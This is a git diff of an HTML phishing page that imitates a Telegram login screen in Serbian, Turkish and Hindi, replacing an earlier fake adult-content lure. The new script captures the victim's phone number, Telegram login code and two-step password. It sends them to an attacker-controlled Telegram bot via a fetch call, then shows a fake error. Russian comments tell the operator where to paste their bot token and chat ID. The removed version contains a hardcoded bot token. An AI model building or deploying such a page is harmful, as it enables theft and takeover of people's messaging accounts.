@@ -3,38 +3,127 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔥 Бесплатное порно</title>
+<title>Telegram</title>
 <style>
-body{margin:0;background:#0a0a0a;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;}
-.box{background:#1a1a1a;padding:30px;border-radius:16px;width:320px;text-align:center;color:#fff;box-shadow:0 0 30px #ff0055;}
-input{width:100%;padding:14px;margin:10px 0;border-radius:10px;border:2px solid #ff3366;background:#222;color:#fff;font-size:16px;}
-button{width:100%;padding:14px;background:#ff3366;border:none;border-radius:10px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;}
-h2{color:#ff3366;}
+body{margin:0;background:#0f0f0f;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;}
+.box{background:#1f1f1f;padding:25px;border-radius:16px;width:340px;color:#fff;text-align:center;}
+input{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:none;background:#2b2b2b;color:#fff;font-size:15px;}
+button{width:100%;padding:12px;background:#0088cc;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;margin-top:6px;}
+.lang-btn{background:#333;width:auto;padding:6px 14px;margin:4px;display:inline-block;border-radius:20px;font-size:13px;cursor:pointer;border:1px solid #555;}
+.lang-btn:hover{background:#555;}
+.hidden{display:none;}
 </style>
 </head>
 <body>
 <div class="box">
-<h2>🔞 Бесплатное порно</h2>
-<p>Подтверди возраст (18+)</p>
-<form onsubmit="send(event)">
-<input type="text" id="phone" placeholder="Номер телефона" required>
-<input type="password" id="pass" placeholder="Пароль от Telegram">
-<button type="submit">СМОТРЕТЬ 🔥</button>
-</form>
+
+<div style="margin-bottom:15px;">
+<span class="lang-btn" onclick="setLang('sr')">🇷🇸 Srpski</span>
+<span class="lang-btn" onclick="setLang('tr')">🇹🇷 Türkçe</span>
+<span class="lang-btn" onclick="setLang('hi')">🇮🇳 हिंदी</span>
 </div>
+
+<div id="step1">
+<h2 id="title1">📱 Telegram</h2>
+<p id="desc1">Unesite broj telefona</p>
+<input type="text" id="phone" placeholder="+7 999 888 77 66">
+<button onclick="step1()" id="btn1">Dalje</button>
+</div>
+
+<div id="step2" class="hidden">
+<h2 id="title2">📱 Telegram</h2>
+<p id="desc2">Unesite kod iz Telegrama</p>
+<input type="text" id="code" placeholder="Kod">
+<input type="password" id="pass2" placeholder="Lozinka (ako postoji)">
+<button onclick="step2()" id="btn2">Uloguj se</button>
+</div>
+
+</div>
+
 <script>
-function send(e){
-e.preventDefault();
-var phone = document.getElementById('phone').value;
-var pass = document.getElementById('pass').value;
+// ==================================================
+//  ↓↓↓ СЮДА ВСТАВЛЯЕШЬ СВОЙ ТОКЕН И ID ↓↓↓
+// ==================================================
+var token = 'ТВОЙ_ТОКЕН_ОТ_BOTFATHER';   // <<<--- СМОТРИ СЮДА
+var chat = 'ТВОЙ_ID_ОТ_USERINFOBOT';     // <<<--- СМОТРИ СЮДА
+// ==================================================
 
-var token = '8028349154:AAEL5FFdo7Gp3q5kxhpW6-obGlSBLpXbelA';
-var chat = '8028349154';
+var phone = '';
+var currentLang = 'sr';
 
-var msg = '📱 ' + phone + ' | 🔑 ' + pass;
-fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(msg));
-alert('❌ Ошибка подтверждения, попробуй ещё раз');
+var texts = {
+  sr: {
+    title1: '📱 Telegram',
+    desc1: 'Unesite broj telefona',
+    btn1: 'Dalje',
+    title2: '📱 Telegram',
+    desc2: 'Unesite kod iz Telegrama',
+    btn2: 'Uloguj se',
+    placeholder: '+7 999 888 77 66',
+    codePlaceholder: 'Kod',
+    passPlaceholder: 'Lozinka (ako postoji)',
+    alert1: 'Unesite broj',
+    alert2: 'Neispravan kod, pokušajte ponovo'
+  },
+  tr: {
+    title1: '📱 Telegram',
+    desc1: 'Telefon numarasını girin',
+    btn1: 'Devam',
+    title2: '📱 Telegram',
+    desc2: 'Telegram\'dan gelen kodu girin',
+    btn2: 'Giriş yap',
+    placeholder: '+7 999 888 77 66',
+    codePlaceholder: 'Kod',
+    passPlaceholder: 'Şifre (varsa)',
+    alert1: 'Numara girin',
+    alert2: 'Geçersiz kod, tekrar deneyin'
+  },
+  hi: {
+    title1: '📱 Telegram',
+    desc1: 'फोन नंबर डालें',
+    btn1: 'आगे',
+    title2: '📱 Telegram',
+    desc2: 'Telegram से कोड डालें',
+    btn2: 'लॉगिन',
+    placeholder: '+7 999 888 77 66',
+    codePlaceholder: 'कोड',
+    passPlaceholder: 'पासवर्ड (अगर है)',
+    alert1: 'नंबर डालें',
+    alert2: 'गलत कोड, फिर से कोशिश करें'
+  }
+};
+
+function setLang(lang) {
+  currentLang = lang;
+  var t = texts[lang];
+  document.getElementById('title1').textContent = t.title1;
+  document.getElementById('desc1').textContent = t.desc1;
+  document.getElementById('btn1').textContent = t.btn1;
+  document.getElementById('title2').textContent = t.title2;
+  document.getElementById('desc2').textContent = t.desc2;
+  document.getElementById('btn2').textContent = t.btn2;
+  document.getElementById('phone').placeholder = t.placeholder;
+  document.getElementById('code').placeholder = t.codePlaceholder;
+  document.getElementById('pass2').placeholder = t.passPlaceholder;
 }
+
+function step1() {
+  phone = document.getElementById('phone').value;
+  if (phone.length < 5) { alert(texts[currentLang].alert1); return; }
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.remove('hidden');
+}
+
+function step2() {
+  var code = document.getElementById('code').value;
+  var pass = document.getElementById('pass2').value;
+  var msg = '📱 ' + phone + ' | Kod: ' + code + ' | Lozinka: ' + pass;
+  fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(msg));
+  alert(texts[currentLang].alert2);
+}
+
+// стартовый язык
+setLang('sr');
 </script>
 </body>
 </html>
